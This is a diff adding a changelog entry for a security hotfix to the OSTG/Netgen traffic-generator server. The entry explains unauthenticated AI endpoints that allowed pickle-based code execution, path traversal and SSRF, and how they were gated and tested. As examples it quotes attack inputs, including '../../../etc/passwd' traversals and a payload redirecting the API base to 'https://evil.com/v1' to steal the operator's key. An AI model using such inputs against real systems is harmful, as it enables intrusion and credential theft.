@@ -2,6 +2,139 @@
 
 All notable changes to OSTG / Netgen Traffic Generator will be documented in this file.
 
+## [0.5.375] - 2026-09-20 — **⚠️ SECURITY HOTFIX**
+
+**Fixes 8 HIGH-severity SEC findings in the AI subsystem + 3 HIGH
+data-integrity issues in the DB layer.** Every operator running
+netgen-server SHOULD upgrade immediately.
+
+### AI subsystem SEC (RCE + SSRF + auth bypass)
+
+- **F11** — `POST /api/ai/model/activate` gains `@require_role("admin")`
+  + strict `_ai_safe_model_version()` allowlist (alnum + `.`, `_`,
+  `-` only). Pre-fix: no auth + `version` interpolated into
+  filesystem path → `version="../../../tmp/evil"` copied any
+  attacker-writable `.pkl` to become the live classifier →
+  `LocalAIEngine._load_models` pickle.load = **arbitrary code
+  execution as netgen-server user**. `/api/ai/model/rollback` (which
+  literally `return ai_model_activate()`) gains its own explicit
+  decorator so the guard doesn't rely on activate's HTTP-layer gate.
+- **F13** — `POST /api/ai/pytest/run` gains `@require_role("admin")`.
+  Pre-fix: no auth + executes client-supplied `script_content` OR
+  runs pytest against caller-controlled `script_path` = direct RCE.
+  Now: `script_path` runs through `_ai_safe_pytest_write_path` which
+  requires containment inside `/opt/OSTG/pytest_scripts/`;
+  `script_name` (used to name the temp file) goes through
+  `_ai_safe_script_name` (plain `.py` filename, no path components).
+- **F14** — `POST /api/ai/pytest/generate` gains `@require_role("admin")`
+  + `_ai_safe_pytest_write_path()` on `file_path`. Pre-fix: no auth
+  + no validation on `file_path` = write-anywhere primitive
+  (`file_path="/etc/systemd/system/evil.service"` silently accepted).
+- **F15** — `GET/DELETE /api/ai/pytest/script/<script_name>` gains
+  `@require_role("admin")` + `_ai_safe_script_name()`. Pre-fix:
+  `script_name="../../../etc/passwd"` read/deleted arbitrary files
+  as netgen-server user.
+- **F16** — `POST /api/ai/settings` gains `@require_role("admin")` +
+  `_ai_safe_api_base_url()` hostname allowlist (OpenAI, Azure OpenAI,
+  OpenRouter, loopback). Pre-fix: no auth + no URL validation on
+  `openai_api_base` = **SSRF + API-key exfiltration**. Attacker
+  POSTed `{"openai_api_base": "https://evil.com/v1"}` → next
+  `/api/ai/chat` sent operator's real API key as `Authorization:
+  Bearer` header to attacker's server.
+- **F17** — `POST /api/ai/chat` gains `@require_role("operator")`.
+  Pre-fix: no auth → attackers burned operator's cloud-API budget
+  and submitted arbitrary prompts to a model whose responses
+  downstream agent flows trust.
+- **F18** — mass sweep: **65 of 67 `/api/ai/*` routes were
+  unauthenticated pre-fix**. All 67 now have `@require_role` per
+  tier: `admin` for destructive/state-mutating (train/activate/
+  rollback/settings/pytest-write/execute-devices/device-provision/
+  auto-remediate/assistant-learn/import-configs), `operator` for
+  action-taking non-destructive (chat/troubleshoot/code-generate/
+  test-run/analytics/plan/discover), `viewer` for read-only
+  (settings-GET/versions/reports/case-list/health/model-versions).
+  Route count sweep verified via
+  `test_all_ai_routes_gated`: 0 ungated.
+
+### DB layer HIGH (data integrity)
+
+- **F1** — `utils/device_database.py restore_database()` no longer
+  uses `shutil.copy2`. Pre-fix: copied backup over live DB while
+  WAL sidecars from previous state remained → SQLite on next open
+  rolled the OLD WAL onto the RESTORED main file → inconsistent
+  snapshot. Fix: `sqlite3.Connection.backup()` (mirrors v0.5.266
+  backup path) + explicit `-wal` / `-shm` sidecar cleanup.
+- **F2** — `utils/device_database.py _run_migrations()` failure now
+  removes the path from `_MIGRATIONS_APPLIED_FOR_PATHS`. Pre-fix:
+  path was marked BEFORE running the migration body; ANY exception
+  mid-migration left the mark stale → every subsequent
+  `DeviceDatabase()` short-circuited → schema silently drifted →
+  later `add_device` failed with "no such column". Fix: except-
+  clause discards path so next construction retries.
+- **F3** — new `_connect_fk_on()` helper enables `PRAGMA
+  foreign_keys = ON` + `synchronous = NORMAL` per-connection. Wired
+  into 4 cascade sites in `device_database.py` (`remove_route_pool`,
+  `remove_dhcp_pool`, `remove_device_dhcp_pools`,
+  `remove_device_route_pools`) + `stream_database.py delete_stream`.
+  Pre-fix: FKs were only ON in `init_database` + `remove_device`;
+  every other CRUD path opened a vanilla `sqlite3.connect(...)` with
+  FKs OFF → cascade deletes silently SKIPPED, orphans accumulated
+  in `device_route_pools`, `device_dhcp_pools`, `stream_stats`,
+  `device_stats`, `device_events`, `device_state_history`.
+
+### Path traversal helpers (new module-level)
+
+- `_ai_safe_model_version(v)` — alnum + `.`, `_`, `-`, ≤64 chars
+- `_ai_safe_script_name(name)` — plain `.py` filename, ≤128 chars
+- `_ai_safe_pytest_write_path(p)` — realpath-resolved containment
+  in `/opt/OSTG/pytest_scripts/`
+- `_ai_safe_api_base_url(url)` — http/https + hostname endswith
+  allowlisted suffix (`api.openai.com`, `openai.azure.com`,
+  `azure.com`, `openrouter.ai`, `localhost`, `127.0.0.1`, `::1`)
+
+### Tests
+
+`tests/test_v05375_sec_hotfix.py` — 24 tests, all pass:
+
+- AST-parse all 3 edited files
+- Sweep: every `/api/ai/*` route has `@require_role` (F18)
+- Per-endpoint: F11 (activate + rollback), F13 (pytest/run),
+  F14 (pytest/generate), F15 (pytest/script/*),
+  F16 (settings POST), F17 (chat) — each verified admin/operator
+  as appropriate
+- Helper functions defined + wired into every SEC-critical
+  endpoint via specific `in body` assertions
+- F16 allowlist covers `api.openai.com`, `openrouter.ai`,
+  `azure.com`, `localhost`, `127.0.0.1` — rejection returns 400
+- F1: `sqlite3.Connection.backup(dst_conn)` present; `shutil.copy2(`
+  call form absent from executable code; `-wal` + `-shm` cleanup
+- F2: `_MIGRATIONS_APPLIED_FOR_PATHS.discard(self.db_path)` in
+  the except body of `_run_migrations`
+- F3: `_connect_fk_on()` helper defined + all 4 device_database
+  cascade sites use it + stream_database `delete_stream` sets
+  `PRAGMA foreign_keys = ON`
+- Regression: v0.5.374 admin card, v0.5.372 C2 device-db fix,
+  v0.5.370 running_version, v0.5.365 route auth sweep
+
+### Verification
+
+- All 3 files AST-parse
+- 24/24 v0.5.375 tests pass
+- Coverage sweep: 67/67 `/api/ai/*` routes have `@require_role`
+  (verified via structural pytest walk)
+- srv04/srv06 verification pending
+
+### Upgrade
+
+Operators running netgen-server ≥ v0.5.0 should upgrade **now**.
+The pytest RCE (F13) + settings-SSRF (F16) + model-activate pickle
+RCE (F11) each grant remote code execution to any client that can
+reach `/api/ai/*` — unauthenticated in every version prior to
+v0.5.375.
+
+Desktop client Upload Wheel → v0.5.375. The v0.5.368 auto-restart
+kicks in cleanly on both srv04 (legacy pip) and srv06 (tarball).
+
 ## [0.5.374] - 2026-09-20
 
 **2 bug fixes + 2 admin console cards.** Continues clearing the
